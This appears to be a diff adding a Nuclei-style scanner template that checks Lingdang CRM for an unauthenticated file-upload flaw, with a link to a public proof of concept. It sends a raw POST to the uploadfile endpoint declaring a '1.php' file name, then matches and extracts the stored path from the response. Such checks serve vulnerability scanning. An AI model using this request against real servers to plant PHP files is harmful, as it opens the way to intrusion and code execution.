@@ -1,0 +1,51 @@
+id: crm-upload-check
+
+info:
+  name: CRM File Upload Check
+  author: kishoriya
+  severity: high
+  description: Checks for file upload functionality in CRM system
+  tags: crm,upload,file
+  
+# - 灵当CRM系统接口uploadfile文件上传漏洞
+# - https://github.com/wy876/POC/blob/main/%E7%81%B5%E5%BD%93CRM/%E7%81%B5%E5%BD%93CRM%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3uploadfile%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
+variables:
+  year: "{{date_time('2006')}}"
+  month: "{{date_time('January')}}"
+
+http:
+  - raw:
+      - |
+        POST /crm/weixinmp/index.php?userid=1&module=Upload&usid=1&action=uploadfile HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Connection: close
+
+        file_info={"name":"1.php"}&hello kishoriya
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - '"filename":'
+          - '"filepath":"storage/{{year}}/{{month}}'
+          - '"newfile_name":'
+        condition: and
+
+      - type: status
+        status:
+          - 200
+          
+      - type: word
+        part: header
+        words:
+          - "application/json"
+          - "text/html"
+        condition: or
+
+    extractors:
+      - type: json
+        name: upload_path
+        json:
+          - '.result.list.filepath'
+          - '.result.list.filename'
